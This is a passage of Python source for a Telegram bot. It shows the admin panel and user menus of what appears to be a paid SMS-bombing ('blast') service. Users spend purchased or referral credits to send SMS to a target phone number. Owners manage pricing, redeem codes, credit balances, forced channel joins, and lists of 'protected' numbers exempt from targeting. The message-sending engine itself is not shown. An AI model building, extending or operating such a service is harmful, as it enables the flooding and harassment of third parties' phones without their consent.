        reply_markup=kb([(sc("cancel"), f"{prefix}:home")]),
        parse_mode="HTML",
    )

@R.message(S.broadcast)
async def owner_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    prefix = fsmd.get("bc_prefix", "owner")
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer("❌ No users!", parse_mode="HTML")
        return
    text = msg.html_text if msg.text else "📢 Broadcast"
    sent = 0
    fail = 0
    for u in users:
        try:
            await msg.bot.send_message(
                int(u),
                f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{text}",
                parse_mode="HTML",
            )
            sent += 1
            await asyncio.sleep(0.05)
        except:
            fail += 1
    await msg.answer(
        f"✅ Broadcast done!\n📨 Sent: {sent}\n❌ Failed: {fail}",
        reply_markup=kb([(sc("home"), f"{prefix}:home")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    STATS / ACTIVITY / HISTORY
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data.in_({"owner:stats", "admin:stats"}))
async def owner_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    prefix = "owner" if cq.data.startswith("owner") else "admin"
    try:
        await cq.message.edit_text(
            api_stats_text(d),
            reply_markup=kb([(sc("back"), f"{prefix}:home")]),
            parse_mode="HTML",
        )
    except:
        pass

@R.callback_query(F.data == "owner:activity")
async def owner_activity(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    log_data = d.get("activity_log", [])[-20:]
    if not log_data:
        await cq.message.edit_text(
            "❌ No activity.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_GEAR, '📜')} <b>Last {len(log_data)} Activities</b>\n"]
    for a in reversed(log_data):
        lines.append(
            f"• <code>{a['uid']}</code> — {a['action']} — {a.get('details', '')[:50]}"
        )
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    hist = d.get("sms_history", {})
    total = sum(len(v) for v in hist.values())
    lines = [f"{em(EMOJI_STAR, '📋')} <b>SMS History (total {total})</b>\n"]
    cnt = 0
    for uid_str, entries in reversed(list(hist.items())):
        for e in reversed(entries[-3:]):
            lines.append(
                f"<code>{uid_str}</code> → <code>{mask_number(e.get('number', ''))}</code>"
            )
            cnt += 1
            if cnt >= 20:
                break
        if cnt >= 20:
            break
    if cnt == 0:
        lines.append("❌ No records.")
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    PRICING PLANS
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    plans = d.get("pricing", {}).get("plans", [])
    lines = [f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b> ({len(plans)})\n"]
    rows = [[btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")]]
    for i, p in enumerate(plans):
        lines.append(
            f"\n{em(EMOJI_STAR, '⭐')} {p['name']} — {p['price']} → {p['credits']}c"
        )
        rows.append([
            btn(f"ᴅᴇʟ {p['name'][:10]}", f"owner:pricing:del:{i}", EMOJI_CROSS, "🗑")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💳')} Plan <b>Name</b> bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:pricing:menu")]),
        parse_mode="HTML",
    )

@R.message(S.add_plan_name)
async def plan_name(msg: Message, state: FSMContext):
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"✅ Name saved!\n\n💰 <b>Price</b> (e.g. ₹99):")

@R.message(S.add_plan_price)
async def plan_price(msg: Message, state: FSMContext):
    await state.update_data(plan_price=msg.text.strip())
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"✅ Price saved!\n\n🎁 <b>Credits</b> (e.g. 100):")

@R.message(S.add_plan_credits)
async def plan_credits(msg: Message, state: FSMContext):
    try:
        c = int(msg.text.strip())
    except:
        await msg.answer("❌ Number!")
        return
    await state.update_data(plan_credits=c)
    await state.set_state(S.add_plan_link)
    await msg.answer(f"✅ Credits: {c}\n\n🔗 <b>Buy Link</b> bhejo (ya 'skip'):")

@R.message(S.add_plan_link)
async def plan_link(msg: Message, state: FSMContext):
    d = load()
    fsmd = await state.get_data()
    await state.clear()
    link = msg.text.strip()
    link = "" if link.lower() == "skip" else link
    d.setdefault("pricing", {}).setdefault("plans", []).append({
        "name": fsmd.get("plan_name", ""),
        "price": fsmd.get("plan_price", ""),
        "credits": fsmd.get("plan_credits", 0),
        "link": link,
    })
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Plan added!",
        reply_markup=kb([(sc("back"), "owner:pricing:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def plan_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    i = int(cq.data.split(":")[-1])
    plans = d.get("pricing", {}).get("plans", [])
    if 0 <= i < len(plans):
        plans.pop(i)
        save(d)
        await cq.answer("🗑!")
    await owner_pricing_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
#                    REDEEM CODES
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    codes = d.get("redeem_codes", {})
    lines = [f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b> ({len(codes)})\n"]
    for code, cd in list(codes.items())[:15]:
        lines.append(
            f"• <code>{code}</code> — {cd['credits']}c — "
            f"Used {cd.get('uses', 0)}/{cd.get('max_uses', 1)}"
        )
    rows = [
        [btn("ɢᴇɴ ᴄᴏᴅᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Gen Redeem</b>\n\nCredits per use bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:redeem:menu")]),
        parse_mode="HTML",
    )

@R.message(S.gen_redeem_credits)
async def redeem_credits(msg: Message, state: FSMContext):
    try:
        c = int(msg.text.strip())
    except:
        await msg.answer("❌ Number!")
        return
    await state.update_data(rc_credits=c)
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"✅ Credits: {c}\n\nUses (kitne log use kar sakte hain):")

@R.message(S.gen_redeem_uses)
async def redeem_uses(msg: Message, state: FSMContext):
    d = load()
    fsmd = await state.get_data()
    try:
        u = int(msg.text.strip())
    except:
        await msg.answer("❌ Number!")
        return
    await state.clear()
    code = "VIP" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    d.setdefault("redeem_codes", {})[code] = {
        "credits": fsmd.get("rc_credits", 0),
        "max_uses": u,
        "uses": 0,
        "used_by": [],
        "created": int(time.time()),
    }
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>Code Generated!</b>\n\n"
        f"<code>{code}</code>\n"
        f"💰 {fsmd.get('rc_credits', 0)} credits\n"
        f"👥 Max uses: {u}",
        reply_markup=kb([(sc("back"), "owner:redeem:menu")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    CREDITS ADD / DEDUCT
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\nUser ID bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.add_credits_uid)
async def credits_add_uid(msg: Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID!")
        return
    if str(uid) not in load().get("users", {}):
        await msg.answer("❌ User not found!")
        return
    await state.update_data(cr_uid=uid)
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"✅ User: <code>{uid}</code>\n\nAmount:")

@R.message(S.add_credits_amount)
async def credits_add_amt(msg: Message, state: FSMContext):
    d = load()
    fsmd = await state.get_data()
    try:
        amt = int(msg.text.strip())
        assert amt > 0
    except:
        await msg.answer("❌ Positive number!")
        return
    uid = fsmd.get("cr_uid")
    add_credits(uid, amt, d)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ +{amt} to <code>{uid}</code>\n💰 New: <b>{get_credits(uid, d)}</b>",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )
    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} +{amt} credits added! New: <b>{get_credits(uid, d)}</b>",
            parse_mode="HTML",
        )
    except:
        pass

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '💸')} <b>Deduct Credits</b>\n\nUser ID:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.deduct_credits_uid)
async def credits_deduct_uid(msg: Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid ID!")
        return
    if str(uid) not in load().get("users", {}):
        await msg.answer("❌ Not found!")
        return
    await state.update_data(dc_uid=uid)
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"✅ User: <code>{uid}</code>\n\nAmount:")

@R.message(S.deduct_credits_amount)
async def credits_deduct_amt(msg: Message, state: FSMContext):
    d = load()
    fsmd = await state.get_data()
    try:
        amt = int(msg.text.strip())
        assert amt > 0
    except:
        await msg.answer("❌ Positive!")
        return
    uid = fsmd.get("dc_uid")
    if not deduct_credits(uid, amt, d):
        await msg.answer("❌ Insufficient!", parse_mode="HTML")
        return
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ -{amt} from <code>{uid}</code>\n💰 New: <b>{get_credits(uid, d)}</b>",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    BULK CREDITS (ALL USERS)
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
        f"Kitne credits sabhi users ko? (e.g. 10)",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.add_all_credits_amount)
async def owner_add_all_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int(msg.text.strip())
        assert amt > 0
    except:
        await msg.answer("❌ Positive!")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer("❌ No users!", parse_mode="HTML")
        return
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amt, d)
        count += 1
    save(d)
    notif = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amt}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} Balance check: /start"
    )
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notif, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n\n"
        f"💰 {amt} credits each\n"
        f"👥 Users: <b>{count}</b>\n"
        f"📨 Notified: <b>{success}</b>",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )
    log_activity(d, "add_credits_all", msg.from_user.id, f"{amt} credits to {count} users")
    save(d)

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '💸')} <b>Deduct Credits from ALL Users</b>\n\n"
        f"Kitne credits katne hain? (e.g. 5)",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int(msg.text.strip())
        assert amt > 0
    except:
        await msg.answer("❌ Positive!")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer("❌ No users!", parse_mode="HTML")
        return
    count = 0
    total = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for uid_str, ud in users.items():
        uid_i = int(uid_str)
        if uid_i in owners or uid_i in admins:
            continue
        cur = ud.get("credits", 0)
        if cur >= amt:
            ud["credits"] = cur - amt
            count += 1
            total += amt
        elif cur > 0:
            ud["credits"] = 0
            count += 1
            total += cur
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Deducted!</b>\n\n"
        f"💰 {amt} per user\n"
        f"👥 Affected: <b>{count}</b>\n"
        f"💳 Total deducted: <b>{total}</b>\n"
        f"👑 Owners/Admins skipped",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    FORCE JOIN MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    fj = d.get("force_join", {})
    status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    lines = [
        f"{em(EMOJI_BELL, '📢')} <b>Force Join Manager</b>\n",
        f"{em(EMOJI_CHECK, '📊')} Status: <b>{status}</b>\n",
        f"{em(EMOJI_STAR, '🔗')} Channels: <b>{len(fj.get('channels', []))}</b>\n",
    ]
    for ch in fj.get("channels", []):
        lines.append(f"• {ch.get('title', 'Channel')} — <code>{ch['id']}</code>")
    rows = [
        [btn("ᴛᴏɢɢʟᴇ ᴏɴ/ᴏғғ", "owner:fj:toggle", EMOJI_GEAR, "🔄")],
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", EMOJI_CHECK, "➕")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    d.setdefault("force_join", {})["enabled"] = not d.get("force_join", {}).get("enabled", False)
    save(d)
    await cq.answer(f"✅ Now {'ON' if d['force_join']['enabled'] else 'OFF'}")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Add Channel</b>\n\n"
        f"Format: <code>Title | Channel_ID_or_@username</code>\n"
        f"Example: <code>My Channel | @mychannel</code>",
        reply_markup=kb([(sc("cancel"), "owner:fj:menu")]),
        parse_mode="HTML",
    )

@R.message(S.fj_add_channel)
async def owner_fj_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" not in text:
        await msg.answer("❌ Format: Title | Channel", parse_mode="HTML")
        return
    title, ch_id = [x.strip() for x in text.split("|", 1)]
    await state.update_data(fj_title=title, fj_channel=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(f"✅ Title: {title}\nChannel: {ch_id}\n\n🔗 Ab invite link bhejo:")

@R.message(S.fj_add_link)
async def owner_fj_link_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ Link must start http!")
        return
    d.setdefault("force_join", {}).setdefault("channels", []).append({
        "title": fsmd.get("fj_title", "Channel"),
        "id": fsmd.get("fj_channel", ""),
        "link": link,
        "required": True,
    })
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Channel added!",
        reply_markup=kb([(sc("back"), "owner:fj:menu")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    SETTINGS
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    st = d.get("settings", {})
    rows = [
        [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:set_ref_credits", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_GIFT, '🎁')} Ref Credits: <b>{st.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{st.get('max_owners', 6)}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:set_ref_credits")
async def owner_set_ref(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Ref Credits</b>\n\nNaya amount bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.message(S.set_ref_credits)
async def owner_set_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int(msg.text.strip())
        assert amt >= 0
    except:
        await msg.answer("❌ Number!")
        return
    d.setdefault("settings", {})["ref_credits"] = amt
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Ref credits set to <b>{amt}</b>",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    PROTECT NUMBER
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Number bhejo (e.g. +919876543210):",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    n = msg.text.strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer("❌ Invalid number!")
        return
    PROTECTED_NUMBERS[n] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protected!</b>\n"
        f"📞 <code>{n}</code>",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} No numbers protected.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n"]
    for n, prot_uid in protected.items():
        pdata = d.get("users", {}).get(str(prot_uid), {})
        lines.append(
            f"📞 <code>{n}</code>\n   🔒 By: <code>{prot_uid}</code> ({pdata.get('name', 'Unknown')})"
        )
    rows = [
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:prot_remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await cq.message.edit_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:prot_remove")
async def owner_prot_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ None!", show_alert=True)
        return
    rows = [
        [btn(n, f"owner:prot_del:{n}", EMOJI_CROSS, "🗑")]
        for n in protected.keys()
    ]
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        "🗑 <b>Remove Protection</b>\n\nSelect:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:prot_del:"))
async def owner_prot_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    n = cq.data.split("owner:prot_del:", 1)[1]
    if n in d.get("protected_numbers", {}):
        del d["protected_numbers"][n]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Removed {n}!")
    await owner_protected_list(cq, state)

# ═══════════════════════════════════════════════════════════════
#                    TRACK NUMBER
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nNumber bhejo:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    n = msg.text.strip()
    await state.clear()
    all_hist = d.get("sms_history", {})
    users_who_sent = []
    for uid_str, entries in all_hist.items():
        for e in entries:
            if e.get("number") == n:
                ud = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({
                    "uid": int(uid_str),
                    "name": ud.get("name", "Unknown"),
                    "timestamp": e.get("timestamp", 0),
                })
                break
    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Tracker</b>\n\n"
            f"📞 <code>{n}</code>\n\n"
            f"❌ No SMS sent to this number.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>Track: <code>{n}</code></b>\n"]
    for u in users_who_sent:
        lines.append(
            f"• <code>{u['uid']}</code> — {u['name'][:20]} — {fmt_time(u['timestamp'])}"
        )
    await msg.answer(
        "\n".join(lines),
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

# ═══════════════════════════════════════════════════════════════
#                    EXPORT SCRIPT
# ═══════════════════════════════════════════════════════════════

@R.callback_query(F.data == "owner:export_script")
async def owner_export(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫!", show_alert=True)
        return
    try:
        with open(__file__, "rb") as f:
            await cq.message.answer_document(
                FSInputFile(__file__, filename="main.py"),
                caption=f"{em(EMOJI_GEAR, '📤')} <b>Bot Source</b>\n{_VERSION}",
                parse_mode="HTML",
            )
        await cq.answer("✅ Sent!")
    except Exception as e:
        await cq.answer(f"❌ Error: {str(e)[:50]}", show_alert=True)

# ═══════════════════════════════════════════════════════════════
#                    TEXT MENU HANDLERS
# ═══════════════════════════════════════════════════════════════

@R.message(F.text == "🚀 Start Blast")
async def txt_start_blast(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not can_use(uid, d):
        await msg.answer("❌ Access nahi hai!", parse_mode="HTML")
        return
    await state.set_state(S.send_number)
    await msg.answer(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('number')}</b> enter karo:",
        parse_mode="HTML",
    )

@R.message(F.text == "📹 Videos")
async def txt_videos(msg: Message, state: FSMContext):
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")

@R.message(F.text == "💰 Credits")
async def txt_credits(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>Your Credits:</b> {get_credits(uid, d)}",
        parse_mode="HTML",
    )

@R.message(F.text == "🎁 Refer & Earn")
async def txt_refer(msg: Message, state: FSMContext):
    d = load()
    code = gen_refer_code(msg.from_user.id, d)
    save(d)
    try:
        me = await msg.bot.get_me()
        link = f"https://t.me/{me.username}?start={code}"
    except:
        link = "N/A"
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>Your Referral</b>\n\n"
        f"Code: <code>{code}</code>\n"
        f"Link: <code>{link}</code>",
        parse_mode="HTML",
    )

@R.message(F.text == "🛑 Stop Blast")
async def txt_stop_blast(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    async with SESSIONS_LOCK:
        sess = USER_SESSIONS.get(uid)
        if sess and sess.task and not sess.task.done():
            sess.cancelled = True
            await msg.answer("🛑 Stop signal bheja!", parse_mode="HTML")
            return
    await msg.answer("❌ No active sending.", parse_mode="HTML")

@R.message(F.text == "⚙️ Help")
@R.message(F.text == "⚙️ Settings")
async def txt_help(msg: Message, state: FSMContext):
    await msg.answer(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>Help</b>\n\n"
        f"1. Start Blast → SMS bhejo\n"
        f"2. Videos → Videos dekho\n"
        f"3. Credits → Balance check\n"
        f"4. Refer → Referral code\n"
        f"5. Stop → Active sending stop",
        parse_mode="HTML",
    )

@R.message(F.text == "👑 Owner Panel")
async def txt_owner_panel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")

@R.message(F.text == "🚀 Send Blast")
async def txt_send_blast(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        return
    await state.set_state(S.owner_send_number if is_owner(uid, d) else S.admin_send_number)
    await msg.answer(f"{em(EMOJI_PHONE, '📞')} <b>Number</b> enter karo:", parse_mode="HTML")

@R.message(F.text == "🔥 Firebase")
async def txt_firebase(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    await msg.answer(
